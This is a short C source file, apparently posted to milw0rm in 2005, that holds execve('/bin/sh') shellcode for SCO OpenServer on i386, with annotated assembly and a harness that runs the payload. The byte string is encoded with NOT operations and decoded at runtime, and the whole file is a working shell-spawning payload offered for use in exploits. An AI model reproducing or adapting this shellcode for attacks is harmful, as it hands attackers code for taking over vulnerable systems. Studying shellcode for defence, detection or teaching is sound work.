/*
 *  minervini at neuralnoise dot com (c) 2005
 *  SCO_SV scosysv 3.2 5.0.7 i386, execve("/bin/sh", ..., NULL);
 */

#include <sys/types.h>
#include <stdio.h>

char *scode =
  "\x31\xc9"             // xor    %ecx,%ecx
  "\x89\xe3"             // mov    %esp,%ebx
  "\x68\xd0\x8c\x97\xff" // push   $0xff978cd0
  "\x68\xd0\x9d\x96\x91" // push   $0x91969dd0
  "\x89\xe2"             // mov    %esp,%edx
  "\x68\xff\xf8\xff\x6f" // push   $0x6ffff8ff
  "\x68\x9a\xff\xff\xff" // push   $0xffffff9a
  "\x80\xf1\x10"         // xor    $0x10,%cl
  "\xf6\x13"             // notb   (%ebx)
  "\x4b"                 // dec    %ebx
  "\xe2\xfb"             // loop   $-3
  "\x91"                 // xchg   %eax,%ecx
  "\x50"                 // push   %eax
  "\x54"                 // push   %esp
  "\x52"                 // push   %edx
  "\x50"                 // push   %eax
  "\x34\x3b"             // xor    $0x3b,%al
  "\xff\xe3";            // jmp    *%ebx

int main () {
   void (*code) () = (void *) scode;
   printf("length: %d\n", strlen(scode));
   code();
   return (0);
}

// milw0rm.com [2005-11-30]